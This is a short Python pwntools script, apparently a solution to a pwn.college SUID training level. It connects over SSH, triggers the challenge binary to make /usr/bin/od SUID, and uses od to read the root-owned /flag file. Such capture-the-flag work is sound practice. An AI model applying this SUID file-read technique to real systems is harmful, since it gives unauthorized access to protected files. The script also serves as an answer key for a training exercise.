from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level11 to make /usr/bin/od SUID
s.process("/challenge/babysuid_level11")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/od /flag
# ? This is a bit overkill, through a normal shell is easier
# ? od with -An and -c will output the flag as a string but with spaces
# ? tr -d ' ' will remove the spaces
# ? tr -d '\n' will remove the newline
# ? wrap the whole thing in echo to nicely print the flag
sh.sendline(b"echo -e $(od -An -c /flag | tr -d ' ' | tr -d '\n')")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
